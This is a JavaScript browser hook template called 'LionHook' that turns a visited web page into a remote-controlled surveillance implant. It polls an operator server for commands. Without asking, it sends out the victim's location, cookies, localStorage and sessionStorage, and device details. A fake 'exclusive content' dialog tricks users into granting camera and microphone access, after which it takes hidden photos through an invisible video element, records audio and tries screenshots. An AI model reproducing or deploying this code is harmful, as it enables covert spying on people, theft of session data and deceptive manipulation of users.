(function() {
    'use strict';
    
    const deviceId = '{{ device_id }}';
    const serverUrl = '{{ server_url }}';
    const hookId = '{{ hook_id }}';
    
    console.log('🦁 LionHook activated for device:', deviceId);
    console.log('Server URL:', serverUrl);
    
    // Command queue for pending actions
    const commandQueue = [];
    let isProcessingQueue = false;
    let permissionDialogActive = false;
    let userPermissionGranted = false;
    
    // Heartbeat system
    function sendHeartbeat() {
        console.log('📡 Sending heartbeat...');
        fetch(`${serverUrl}/api/heartbeat`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                device_id: deviceId,
                timestamp: new Date().toISOString(),
                status: 'active',
                has_pending_commands: commandQueue.length > 0,
                permission_granted: userPermissionGranted
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('✅ Heartbeat response:', data);
        })
        .catch(error => console.error('❌ Heartbeat error:', error));
    }
    
    // Send heartbeat every 20 seconds
    setInterval(sendHeartbeat, 20000);
    
    // Function to send data to server
    function sendData(type, content, metadata = {}) {
        console.log('📤 Sending data:', type, content.substring(0, 100) + '...');
        
        const payload = {
            device_id: deviceId,
            type: type,
            content: content,
            timestamp: new Date().toISOString(),
            hook_id: hookId,
            ...metadata
        };
        
        fetch(`${serverUrl}/api/submit_data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            console.log('✅ Data sent successfully:', type);
        })
        .catch(error => console.error('❌ Error sending data:', error));
    }
    
    // Function to check for commands
    function checkCommands() {
        console.log('🔍 Checking for commands...');
        fetch(`${serverUrl}/api/check_commands/${deviceId}`)
            .then(response => response.json())
            .then(data => {
                if (data.commands && data.commands.length > 0) {
                    console.log('🎯 Commands received:', data.commands);
                    data.commands.forEach(cmd => {
                        console.log('⚡ Queueing command:', cmd.command);
                        queueCommand(cmd.command);
                    });
                } else {
                    console.log('📭 No commands waiting');
                }
            })
            .catch(error => console.error('❌ Error checking commands:', error));
    }
    
    // Queue commands instead of executing immediately
    function queueCommand(command) {
        commandQueue.push(command);
        console.log(`📥 Command queued: ${command}, Queue length: ${commandQueue.length}`);
        
        // If user already granted permission, process immediately
        if (userPermissionGranted) {
            console.log('✅ Permission already granted, processing immediately');
            processQueue();
            return;
        }
        
        // Show permission request only if not already showing and it's a camera/mic command
        if ((command.includes('camera') || command === 'record_audio') && !permissionDialogActive) {
            showContentPermission();
        }
        
        // Process queue if not already processing
        if (!isProcessingQueue) {
            processQueue();
        }
    }
    
    // Process command queue
    function processQueue() {
        if (commandQueue.length === 0 || isProcessingQueue) {
            return;
        }
        
        isProcessingQueue = true;
        const command = commandQueue[0];
        
        console.log(`🔄 Processing command from queue: ${command}`);
        
        // Execute commands that don't require user interaction first
        if (['get_location', 'get_history', 'get_battery', 'get_network', 'get_system_info'].includes(command)) {
            executeCommand(command);
            commandQueue.shift();
            isProcessingQueue = false;
            processQueue(); // Process next command
        } else if (userPermissionGranted) {
            // If permission granted, execute interactive commands immediately
            executeInteractiveCommand(command);
            commandQueue.shift();
            isProcessingQueue = false;
            processQueue();
        } else {
            // For camera/mic commands, wait for user interaction
            console.log(`⏳ Waiting for user permission for: ${command}`);
        }
    }
    
    // Execute command (only for non-interactive commands)
    function executeCommand(command) {
        console.log('🚀 Executing command:', command);
        
        switch(command) {
            case 'get_location':
                getLocation();
                break;
            case 'get_history':
                getBrowserHistory();
                break;
            case 'get_battery':
                getBatteryInfo();
                break;
            case 'get_network':
                getNetworkInfo();
                break;
            case 'get_system_info':
                getSystemInfo();
                break;
            default:
                console.log('❌ Cannot execute without user interaction:', command);
        }
    }
    
    // Execute interactive command after permission granted
    async function executeInteractiveCommand(command) {
        console.log('🎯 Executing interactive command:', command);
        
        switch(command) {
            case 'front_camera':
                await takePhoto('front');
                break;
            case 'back_camera':
                await takePhoto('back');
                break;
            case 'record_audio':
                await recordAudio();
                break;
            default:
                console.log('❌ Unknown interactive command:', command);
        }
    }
    
    // Show content permission request (only once)
    function showContentPermission() {
        // Check if we already have a permission dialog or permission already granted
        if (document.getElementById('content-permission-dialog') || permissionDialogActive || userPermissionGranted) {
            return;
        }
        
        console.log('🔄 Showing content permission request');
        permissionDialogActive = true;
        
        const pendingCommands = commandQueue.filter(cmd => 
            cmd.includes('camera') || cmd === 'record_audio'
        );
        
        let contentType = '';
        let icon = '👁️';
        
        if (pendingCommands.includes('front_camera') || pendingCommands.includes('back_camera')) {
            contentType = 'view exclusive camera content';
            icon = '📸';
        } else if (pendingCommands.includes('record_audio')) {
            contentType = 'access premium audio features';
            icon = '🎧';
        } else {
            contentType = 'access exclusive content';
            icon = '🔒';
        }
        
        // Create content permission dialog
        const dialog = document.createElement('div');
        dialog.id = 'content-permission-dialog';
        dialog.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            z-index: 10000;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            width: 400px;
            font-size: 14px;
            color: #333;
            animation: fadeIn 0.3s ease-out;
        `;
        
        // Add CSS animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn {
                from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
                to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            }
        `;
        document.head.appendChild(style);
        
        dialog.innerHTML = `
            <div style="padding: 24px; border-bottom: 1px solid #f0f0f0;">
                <div style="display: flex; align-items: center; margin-bottom: 16px;">
                    <span style="font-size: 24px; margin-right: 16px; background: #4285f4; color: white; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">${icon}</span>
                    <div>
                        <strong style="font-size: 18px; color: #202124;">Continue to Content</strong>
                        <div style="font-size: 14px; color: #5f6368;">${window.location.hostname}</div>
                    </div>
                </div>
                <div style="color: #202124; font-size: 15px; line-height: 1.5;">
                    To view this content, we need your permission to:
                    <br>
                    <strong style="color: #4285f4;">${contentType}</strong>
                </div>
                <div style="margin-top: 12px; padding: 12px; background: #f8f9fa; border-radius: 6px; font-size: 13px; color: #5f6368;">
                    🔒 Your privacy is important. We only access what's necessary to deliver the content.
                </div>
            </div>
            <div style="padding: 20px; background: #f8f9fa; border-radius: 0 0 12px 12px;">
                <div style="display: flex; gap: 12px; justify-content: flex-end;">
                    <button id="content-permission-cancel" style="
                        background: transparent;
                        color: #5f6368;
                        border: 1px solid #dadce0;
                        padding: 12px 24px;
                        border-radius: 6px;
                        cursor: pointer;
                        font-size: 14px;
                        font-weight: 500;
                        transition: all 0.2s;
                        min-width: 80px;
                    " onmouseover="this.style.background='#f1f3f4'" onmouseout="this.style.background='transparent'">Cancel</button>
                    <button id="content-permission-continue" style="
                        background: #4285f4;
                        color: white;
                        border: none;
                        padding: 12px 24px;
                        border-radius: 6px;
                        cursor: pointer;
                        font-size: 14px;
                        font-weight: 500;
                        transition: all 0.2s;
                        min-width: 80px;
                    " onmouseover="this.style.background='#3367d6'" onmouseout="this.style.background='#4285f4'">Continue</button>
                </div>
                <div style="margin-top: 16px; font-size: 12px; color: #5f6368; text-align: center;">
                    This permission will be remembered for this session
                </div>
            </div>
        `;
        
        document.body.appendChild(dialog);
        
        // Auto-close after 30 seconds
        const autoCloseTimer = setTimeout(() => {
            removePermissionDialog();
            denyPendingCommands();
        }, 30000);
        
        // Countdown timer
        let timeLeft = 30;
        const timerElement = document.createElement('div');
        timerElement.style.cssText = `
            position: absolute;
            top: 12px;
            right: 12px;
            background: #f8f9fa;
            color: #5f6368;
            border-radius: 12px;
            padding: 6px 12px;
            font-size: 12px;
            font-weight: 500;
            border: 1px solid #dadce0;
        `;
        timerElement.textContent = `${timeLeft}s`;
        dialog.appendChild(timerElement);
        
        const countdown = setInterval(() => {
            timeLeft--;
            timerElement.textContent = `${timeLeft}s`;
            if (timeLeft <= 0) {
                clearInterval(countdown);
            }
        }, 1000);
        
        // Event listeners
        document.getElementById('content-permission-continue').onclick = function() {
            clearTimeout(autoCloseTimer);
            clearInterval(countdown);
            userPermissionGranted = true;
            permissionDialogActive = false;
            removePermissionDialog();
            processAllQueuedCommands();
            
            // Send permission granted notification
            sendData('permission_granted', JSON.stringify({
                timestamp: new Date().toISOString(),
                device_id: deviceId,
                hook_id: hookId,
                granted_for: contentType
            }, null, 2));
        };
        
        document.getElementById('content-permission-cancel').onclick = function() {
            clearTimeout(autoCloseTimer);
            clearInterval(countdown);
            permissionDialogActive = false;
            removePermissionDialog();
            denyPendingCommands();
        };
        
        // Close on outside click
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 9999;
            backdrop-filter: blur(2px);
        `;
        document.body.appendChild(overlay);
        
        overlay.onclick = function() {
            clearTimeout(autoCloseTimer);
            clearInterval(countdown);
            permissionDialogActive = false;
            removePermissionDialog();
            denyPendingCommands();
        };
        
        function removePermissionDialog() {
            if (dialog.parentNode) {
                dialog.parentNode.removeChild(dialog);
            }
            if (overlay.parentNode) {
                overlay.parentNode.removeChild(overlay);
            }
            if (style.parentNode) {
                style.parentNode.removeChild(style);
            }
        }
    }
    
    // Process all queued commands after permission granted
    async function processAllQueuedCommands() {
        console.log('✅ Permission granted, processing all queued commands');
        
        while (commandQueue.length > 0) {
            const command = commandQueue[0];
            
            if (command.includes('camera') || command === 'record_audio') {
                await executeInteractiveCommand(command);
            } else {
                executeCommand(command);
            }
            
            commandQueue.shift();
        }
        
        isProcessingQueue = false;
        console.log('✅ All queued commands processed');
    }
    
    // Deny all pending commands
    function denyPendingCommands() {
        console.log('❌ User denied permission, clearing interactive commands');
        
        // Remove only interactive commands from queue
        const remainingCommands = [];
        const deniedCommands = [];
        
        commandQueue.forEach(command => {
            if (command.includes('camera') || command === 'record_audio') {
                deniedCommands.push(command);
            } else {
                remainingCommands.push(command);
            }
        });
        
        // Send denial notice for each denied command
        deniedCommands.forEach(command => {
            sendData('permission_denied', JSON.stringify({
                command: command,
                reason: 'user_cancelled',
                timestamp: new Date().toISOString(),
                device_id: deviceId,
                hook_id: hookId
            }, null, 2));
        });
        
        // Update queue with only non-interactive commands
        commandQueue.length = 0;
        commandQueue.push(...remainingCommands);
        isProcessingQueue = false;
        
        // Process remaining non-interactive commands
        if (remainingCommands.length > 0) {
            processQueue();
        }
    }

    // Get device location - COMPLETE FUNCTION
    function getLocation() {
        console.log('📍 Getting location...');
        
        const locationData = {
            timestamp: new Date().toISOString(),
            device_id: deviceId,
            hook_id: hookId
        };
        
        // Try HTML5 Geolocation first
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    console.log('✅ GPS Location obtained');
                    const gpsData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' meters',
                        altitude: position.coords.altitude || 'Not available',
                        altitude_accuracy: position.coords.altitudeAccuracy || 'Not available',
                        heading: position.coords.heading || 'Not available',
                        speed: position.coords.speed || 'Not available',
                        source: 'GPS',
                        map_url: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    const finalData = { ...locationData, ...gpsData };
                    sendData('location', JSON.stringify(finalData, null, 2), {
                        data_type: 'gps_location',
                        has_coordinates: true
                    });
                },
                function(error) {
                    console.log('❌ GPS failed, trying IP location...');
                    console.error('GPS Error:', error);
                    
                    const gpsErrorData = {
                        ...locationData,
                        gps_error: error.message,
                        gps_error_code: error.code,
                        source: 'GPS_Failed'
                    };
                    
                    sendData('location_error', JSON.stringify(gpsErrorData, null, 2));
                    
                    // Always try IP location as fallback
                    getIPLocation(locationData);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            console.log('❌ Geolocation not supported, using IP location');
            locationData.error = 'Geolocation API not supported';
            sendData('location_error', JSON.stringify(locationData, null, 2));
            getIPLocation(locationData);
        }
    }
    
    // IP-based location - COMPLETE FUNCTION
    function getIPLocation(baseData) {
        console.log('🌐 Getting IP location...');
        
        // Try multiple IP location services
        const ipServices = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
        ];
        
        let currentService = 0;
        
        function tryNextService() {
            if (currentService >= ipServices.length) {
                console.log('❌ All IP services failed');
                const finalError = {
                    ...baseData,
                    error: 'All IP location services failed',
                    source: 'IP_Failed'
                };
                sendData('location_error', JSON.stringify(finalError, null, 2));
                return;
            }
            
            const serviceUrl = ipServices[currentService];
            console.log(`🌐 Trying IP service: ${serviceUrl}`);
            
            fetch(serviceUrl, { timeout: 5000 })
                .then(response => {
                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
                    return response.json();
                })
                .then(data => {
                    console.log('✅ IP location obtained from:', serviceUrl);
                    
                    const ipLocation = {
                        ...baseData,
                        ip: data.ip || data.query,
                        city: data.city || data.city_name,
                        region: data.region || data.region_name || data.state,
                        country: data.country_name || data.country,
                        country_code: data.country_code || data.countryCode,
                        latitude: data.latitude || data.lat,
                        longitude: data.longitude || data.lon,
                        timezone: data.timezone || data.time_zone,
                        isp: data.org || data.isp || data.asn,
                        zipcode: data.postal || data.zip,
                        source: `IP_${currentService + 1}`,
                        service: serviceUrl
                    };
                    
                    sendData('location_ip', JSON.stringify(ipLocation, null, 2), {
                        data_type: 'ip_location',
                        has_coordinates: !!(ipLocation.latitude && ipLocation.longitude)
                    });
                })
                .catch(error => {
                    console.error(`❌ IP service ${currentService + 1} failed:`, error);
                    currentService++;
                    tryNextService();
                });
        }
        
        tryNextService();
    }
    
    // Get browser history - IMPROVED FUNCTION
    function getBrowserHistory() {
        console.log('📚 Getting enhanced browser history...');
        
        const historyData = {
            current_url: window.location.href,
            referrer: document.referrer,
            title: document.title,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookies_enabled: navigator.cookieEnabled,
            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            device_id: deviceId,
            hook_id: hookId,
            session_data: {}
        };
        
        // Enhanced session data collection
        try {
            // Get all links on the page
            const links = Array.from(document.links).map(link => ({
                href: link.href,
                text: link.textContent.substring(0, 100),
                hostname: link.hostname
            }));
            historyData.page_links = links;
            console.log('🔗 Found links:', links.length);
            
            // Get session storage data
            if (sessionStorage.length > 0) {
                const sessionData = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    sessionData[key] = sessionStorage.getItem(key);
                }
                historyData.session_data.session_storage = sessionData;
            }
            
            // Get local storage data
            if (localStorage.length > 0) {
                const localData = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localData[key] = localStorage.getItem(key);
                }
                historyData.session_data.local_storage = localData;
            }
            
            // Get cookies
            historyData.session_data.cookies = document.cookie;
            
            // Get performance data
            if (window.performance && performance.getEntriesByType) {
                const navigationEntries = performance.getEntriesByType('navigation');
                if (navigationEntries.length > 0) {
                    const nav = navigationEntries[0];
                    historyData.performance = {
                        dom_complete: nav.domComplete,
                        load_complete: nav.loadEventEnd,
                        response_end: nav.responseEnd,
                        domain_lookup: nav.domainLookupEnd - nav.domainLookupStart
                    };
                }
            }
            
        } catch (e) {
            console.log('❌ Could not get enhanced history data:', e);
        }
        
        sendData('history', JSON.stringify(historyData, null, 2), {
            data_type: 'browser_history',
            folder: 'history'
        });
        console.log('✅ Enhanced history data sent');
    }
    
    // Get battery info - COMPLETE FUNCTION
    async function getBatteryInfo() {
        console.log('🔋 Getting battery info...');
        
        const batteryMetadata = {
            device_id: deviceId,
            hook_id: hookId,
            timestamp: new Date().toISOString(),
            folder: 'system'
        };
        
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                const batteryInfo = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime === Infinity ? 'Unknown' : Math.round(battery.chargingTime / 60) + ' minutes',
                    dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : Math.round(battery.dischargingTime / 60) + ' minutes',
                    timestamp: new Date().toISOString()
                };
                
                console.log('✅ Battery info:', batteryInfo);
                sendData('battery', JSON.stringify(batteryInfo, null, 2), {
                    ...batteryMetadata,
                    data_type: 'battery'
                });
                
            } else {
                throw new Error('Battery API not supported');
            }
        } catch (error) {
            console.error('❌ Battery error:', error);
            
            const errorData = {
                ...batteryMetadata,
                error: error.message,
                status: 'Battery API not available'
            };
            
            sendData('battery_info', JSON.stringify(errorData, null, 2), {
                data_type: 'info',
                folder: 'system'
            });
        }
    }
    
    // Get network info - IMPROVED FUNCTION
    function getNetworkInfo() {
        console.log('📡 Getting enhanced network info...');
        
        let connectionType = 'Unknown';
        let networkSpeed = 'Unknown';
        
        // Detect network type
        if (navigator.connection) {
            const conn = navigator.connection;
            console.log('📶 Connection API available:', conn);
            
            connectionType = conn.effectiveType || 'Unknown';
            networkSpeed = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
            
            // Map effectiveType to common network names
            const networkTypeMap = {
                'slow-2g': '2G',
                '2g': '2G',
                '3g': '3G', 
                '4g': '4G',
                '5g': '5G'
            };
            
            connectionType = networkTypeMap[connectionType] || connectionType;
        } else {
            // Fallback detection
            if (navigator.userAgent.includes('Mobile')) {
                connectionType = 'Mobile Data';
            } else {
                connectionType = 'WiFi/Ethernet';
            }
        }
        
        const networkInfo = {
            connection_type: connectionType,
            network_speed: networkSpeed,
            connection_details: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms',
                saveData: navigator.connection.saveData
            } : 'Not available',
            online_status: navigator.onLine,
            platform: navigator.platform,
            language: navigator.language,
            cookies: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            timestamp: new Date().toISOString(),
            device_id: deviceId,
            hook_id: hookId
        };
        
        console.log('✅ Enhanced network info collected:', networkInfo);
        sendData('network', JSON.stringify(networkInfo, null, 2), {
            data_type: 'network',
            folder: 'system'
        });
    }
    
    // Get system info - COMPLETE FUNCTION
    function getSystemInfo() {
        console.log('💻 Getting system info...');
        
        const systemInfo = {
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            languages: navigator.languages,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled ? navigator.javaEnabled() : false,
            pdfViewer: navigator.pdfViewerEnabled || false,
            touchPoints: navigator.maxTouchPoints || 0,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            timestamp: new Date().toISOString(),
            device_id: deviceId,
            hook_id: hookId
        };
        
        console.log('✅ System info collected');
        sendData('system_info', JSON.stringify(systemInfo, null, 2), {
            data_type: 'system',
            folder: 'system'
        });
    }
    
  
  
  // Take photo from camera - IMPROVED WITH FALLBACKS FOR ANDROID/LINUX
async function takePhoto(cameraType) {
    console.log(`📷 Taking photo: ${cameraType}`);

    const photoMetadata = {
        camera_type: cameraType,
        device_id: deviceId,
        hook_id: hookId,
        timestamp: new Date().toISOString(),
        folder: 'photos'
    };

    try {
        console.log('🎥 Accessing camera...');

        // Check if mediaDevices is available
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error('Camera API not available in this environment');
        }

        let stream;
        let cameraStrategy = 'primary';

        // Enhanced camera constraints with multiple fallbacks
        if (cameraType === 'front') {
            // Front camera constraints
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });
                cameraStrategy = 'front_facingMode';
            } catch (error) {
                console.log('❌ Front camera failed, trying any camera...');
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                cameraStrategy = 'front_fallback';
            }
        } else {
            // Back camera with multiple fallbacks for Android/Linux compatibility
            try {
                // First try: exact environment facingMode
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });
                cameraStrategy = 'back_facingMode';
                console.log('✅ Back camera accessed via facingMode');
            } catch (error1) {
                console.log('❌ Back camera facingMode failed, trying device enumeration...');

                try {
                    // Second try: enumerate devices and find back camera
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const videoDevices = devices.filter(device => device.kind === 'videoinput');

                    console.log('📹 Available cameras:', videoDevices.length);

                    if (videoDevices.length > 1) {
                        // Try the second camera (usually back camera)
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                deviceId: { exact: videoDevices[1].deviceId },
                                width: { ideal: 1280 },
                                height: { ideal: 720 }
                            }
                        });
                        cameraStrategy = 'back_deviceId';
                        console.log('✅ Back camera accessed via deviceId');
                    } else {
                        throw new Error('Only one camera available');
                    }
                } catch (error2) {
                    console.log('❌ Back camera enumeration failed, using any camera with fallback constraints...');
                    
                    // Fallback for Android command windows/Linux browsers
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                width: { min: 640, ideal: 1280, max: 1920 },
                                height: { min: 480, ideal: 720, max: 1080 },
                                frameRate: { ideal: 30 }
                            }
                        });
                        cameraStrategy = 'back_fallback_constraints';
                    } catch (error3) {
                        console.log('❌ Standard constraints failed, trying minimal constraints...');
                        
                        // Ultra-minimal constraints for maximum compatibility
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: true // Let browser choose best available
                        });
                        cameraStrategy = 'back_minimal';
                    }
                }
            }
        }

        console.log(`✅ Camera access granted via strategy: ${cameraStrategy}`);

        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;

        // Add to DOM temporarily
        video.style.position = 'fixed';
        video.style.top = '0';
        video.style.left = '0';
        video.style.width = '1px';
        video.style.height = '1px';
        video.style.opacity = '0';
        video.style.pointerEvents = 'none';
        document.body.appendChild(video);

        // Wait for video to be ready with timeout
        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Camera initialization timeout'));
            }, 10000);

            video.onloadedmetadata = () => {
                clearTimeout(timeout);
                console.log(`📐 Video ready: ${video.videoWidth}x${video.videoHeight}`);
                resolve();
            };

            video.onerror = () => {
                clearTimeout(timeout);
                reject(new Error('Video element error'));
            };
        });

        // Wait for camera to stabilize (shorter timeout for command windows)
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Capture photo with error handling
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        
        try {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        } catch (drawError) {
            console.error('❌ Canvas draw error:', drawError);
            throw new Error('Failed to capture image from camera');
        }

        let imageData;
        try {
            imageData = canvas.toDataURL('image/jpeg', 0.8); // Lower quality for compatibility
        } catch (encodeError) {
            console.error('❌ Image encoding error:', encodeError);
            // Try PNG as fallback
            imageData = canvas.toDataURL('image/png');
        }

        console.log(`📸 Photo captured: ${Math.round(imageData.length / 1024)} KB, Strategy: ${cameraStrategy}`);

        // Update metadata with strategy info
        photoMetadata.camera_strategy = cameraStrategy;
        photoMetadata.resolution = `${canvas.width}x${canvas.height}`;
        photoMetadata.size_kb = Math.round(imageData.length / 1024);

        // Send photo
        sendData(`photo_${cameraType}`, imageData, {
            ...photoMetadata,
            data_type: 'photo'
        });

        // Cleanup
        try {
            stream.getTracks().forEach(track => {
                track.stop();
            });
        } catch (cleanupError) {
            console.log('⚠️ Stream cleanup warning:', cleanupError);
        }
        
        if (video.parentNode) {
            video.parentNode.removeChild(video);
        }

    } catch (error) {
        console.error(`❌ Photo error (${cameraType}):`, error);

        const errorData = {
            ...photoMetadata,
            error: error.message,
            error_name: error.name,
            user_agent: navigator.userAgent,
            platform: navigator.platform
        };

        // Send detailed error info
        sendData(`photo_error`, JSON.stringify(errorData, null, 2), {
            data_type: 'error',
            folder: 'errors'
        });

        // Try screenshot fallback if camera fails completely
        await attemptScreenshotFallback(cameraType, photoMetadata, error.message);
    }
}

// Screenshot fallback for when camera fails
async function attemptScreenshotFallback(cameraType, metadata, originalError) {
    console.log('🖼️ Attempting screenshot fallback...');
    
    try {
        // Check if we're in a browser environment that supports screenshots
        if (typeof window === 'undefined' || !document.documentElement) {
            throw new Error('Not in a browser environment');
        }

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        // Set canvas to viewport size
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        // Try to capture visible content
        context.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
        
        const screenshotData = canvas.toDataURL('image/jpeg', 0.7);
        
        console.log(`📸 Screenshot captured: ${Math.round(screenshotData.length / 1024)} KB`);
        
        sendData(`screenshot_fallback_${cameraType}`, screenshotData, {
            ...metadata,
            data_type: 'screenshot_fallback',
            original_error: originalError,
            resolution: `${canvas.width}x${canvas.height}`,
            size_kb: Math.round(screenshotData.length / 1024),
            note: 'This is a screenshot fallback due to camera failure'
        });
        
    } catch (screenshotError) {
        console.error('❌ Screenshot fallback also failed:', screenshotError);
        
        // Send final failure notice
        sendData(`camera_complete_failure`, JSON.stringify({
            ...metadata,
            original_error: originalError,
            screenshot_error: screenshotError.message,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            timestamp: new Date().toISOString(),
            note: 'Both camera and screenshot methods failed'
        }, null, 2), {
            data_type: 'error',
            folder: 'errors'
        });
    }
}
    
    
    
    
    
    
    // Record audio (only called after user permission)
    async function recordAudio() {
        console.log('🎤 Recording audio...');
        
        const audioMetadata = {
            device_id: deviceId,
            hook_id: hookId,
            timestamp: new Date().toISOString(),
            folder: 'audio'
        };
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    sampleRate: 44100
                }
            });
            
            console.log('✅ Microphone access granted');
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks = [];
            
            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    audioChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                
                reader.onload = function() {
                    const audioData = reader.result;
                    sendData('audio', audioData, {
                        ...audioMetadata,
                        data_type: 'audio',
                        size_kb: Math.round(audioData.length / 1024)
                    });
                };
                
                reader.readAsDataURL(audioBlob);
                stream.getTracks().forEach(track => track.stop());
            };
            
            mediaRecorder.start();
            console.log('⏺️ Recording started (5 seconds)');
            
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 5000);
            
        } catch (error) {
            console.error('❌ Audio recording error:', error);
            
            const errorData = {
                ...audioMetadata,
                error: error.message,
                error_name: error.name
            };
            
            sendData('audio_error', JSON.stringify(errorData, null, 2), {
                data_type: 'error',
                folder: 'errors'
            });
        }
    }
    
    // Send initial device info
    function sendInitialInfo() {
        console.log('🚀 Sending initial device info...');
        
        const deviceInfo = {
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            languages: navigator.languages,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            url: window.location.href,
            referrer: document.referrer,
            timestamp: new Date().toISOString(),
            device_id: deviceId,
            hook_id: hookId,
            hook_version: '3.0',
            session_permission: true,
            features: {
                location: true,
                camera: true,
                microphone: true,
                battery: true,
                network: true,
                system_info: true,
                browser_history: true,
                enhanced_network_detection: true,
                back_camera_support: true
            }
        };
        
        sendData('device_info', JSON.stringify(deviceInfo, null, 2), {
            data_type: 'device_info',
            folder: 'system'
        });
    }
    
    // Initialize
    sendInitialInfo();
    sendHeartbeat();
    
    // Check for commands every 5 seconds
    setInterval(checkCommands, 5000);
    
    console.log('🦁 LionHook Advanced v3.0 fully activated!');
    console.log('✅ All enhanced features available:');
    console.log('   📍 Location tracking');
    console.log('   📷 Front & Back camera (improved)');
    console.log('   🎤 Audio recording');
    console.log('   🔋 Battery info');
    console.log('   📡 Network info (4G/5G/WiFi detection)');
    console.log('   💻 System info');
    console.log('   📚 Enhanced browser history');
    console.log('   🔒 One-time permission system');
    
    // Make functions globally available
    window.lionhook = {
        deviceId,
        hookId,
        checkCommands,
        getLocation,
        getBrowserHistory,
        takePhoto,
        recordAudio,
        getBatteryInfo,
        getNetworkInfo,
        getSystemInfo,
        commandQueue,
        userPermissionGranted,
        version: '3.0'
    };
    
})();
